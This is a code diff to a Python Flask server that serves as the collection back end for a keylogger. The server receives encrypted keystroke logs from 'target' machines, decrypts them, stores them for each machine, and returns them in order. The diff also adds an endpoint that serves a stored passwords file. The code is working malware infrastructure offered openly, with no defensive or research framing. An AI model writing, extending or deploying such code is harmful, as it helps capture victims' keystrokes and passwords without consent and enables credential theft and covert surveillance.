@@ -1,7 +1,5 @@
 import os
-import sys
-
-sys.path.append(os.path.join(os.path.dirname(__file__), '..'))
+from datetime import datetime
 from flask import Flask, jsonify, request, json
 from flask_cors import CORS
 import time
@@ -9,23 +7,21 @@ from KeyLoggerAgent import encryptor
 
 DATA_FOLDER = os.path.join(os.path.dirname(__file__), "data")
 
-
 def generate_log_filename():
     return "log_" + time.strftime("%Y-%m-%d") + ".txt"
 
-
 app = Flask('app')
 CORS(app)
-
 
 @app.route('/api/upload', methods=['POST'])
 def upload():
     data = request.get_json()
     print(data)
+
     if not data or "machine" not in data or "data" not in data:
         return jsonify({"error": "Invalid payload"}), 400
+
     machine = data["machine"]
-    # log_data = data["data"]
     log_data_decrypted = encryptor.Encryptor().decrypt(data["data"])
     print(f"Decrypted data: {log_data_decrypted}")
 
@@ -37,12 +33,27 @@ def upload():
     file_path = os.path.join(machine_folder, filename)
     timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
 
-    with open(file_path, "a", encoding="utf-8") as f:
-        new_entry = {
-            "timestamp": timestamp,
-            "data": log_data_decrypted
-        }
-        f.write(json.dumps(new_entry, ensure_ascii=False, indent=4, sort_keys=False) + "\n")
+    new_entry = {
+        "timestamp": timestamp,
+        "data": log_data_decrypted
+    }
+
+    # Read existing data if the file exists
+    existing_data = []
+    if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
+        with open(file_path, "r", encoding="utf-8") as f:
+            try:
+                existing_data = json.load(f)  # Load JSON list
+            except json.JSONDecodeError:
+                print("Error: JSON file is corrupted or empty. Resetting file.")
+                existing_data = []
+
+    # Append the new entry
+    existing_data.append(new_entry)
+
+    # Write back the full JSON list efficiently
+    with open(file_path, "w", encoding="utf-8") as f:
+        json.dump(existing_data, f, ensure_ascii=False, indent=4)
 
     return jsonify({"status": "success", "file": file_path, "data": log_data_decrypted}), 200
 
@@ -63,21 +74,33 @@ def get_target_machine_key_strokes():
     if not os.path.exists(machine_folder):
         return jsonify({"error": "Machine not found"}), 404
 
-    files = os.listdir(machine_folder)
-    files.sort(reverse=True)
-    data = []
+    files = sorted(os.listdir(machine_folder), reverse=False)  # Oldest first
+    keystrokes = []
+
     for file in files:
-        with open(os.path.join(machine_folder, file), "r", encoding="utf-8") as f:
-            file_data = json.load(f)
-            for key, value in file_data.items():
-                for entry in value:
-                    data.append(entry)
-    return jsonify({"data": data}), 200
+        file_path = os.path.join(machine_folder, file)
+        try:
+            with open(file_path, "r", encoding="utf-8") as f:
+                file_data = json.load(f)  # Load the entire JSON list
+                if isinstance(file_data, list):  # Ensure it's a valid list
+                    keystrokes.extend(file_data)
+        except json.JSONDecodeError:
+            print(f"Warning: Skipping corrupted file {file_path}")
+
+    # Sort by timestamp (assuming valid timestamps)
+    try:
+        keystrokes.sort(key=lambda x: datetime.strptime(x["timestamp"], "%Y-%m-%d %H:%M:%S"))
+    except KeyError:
+        return jsonify({"error": "Invalid data format in logs"}), 500
+
+    return jsonify({"keystrokes": keystrokes}), 200
 
 
-@app.route('/api/decrypt_data', methods=['GET'])
-def decrypt_data():
-    return jsonify({"status": "success"}), 200
+@app.route('/api/get_passwords', methods=['GET'])
+def get_passwords():
+    with open('passwords.json', 'r') as f:
+        data = json.load(f)
+    return jsonify(data), 200
 
 
 if __name__ == '__main__':
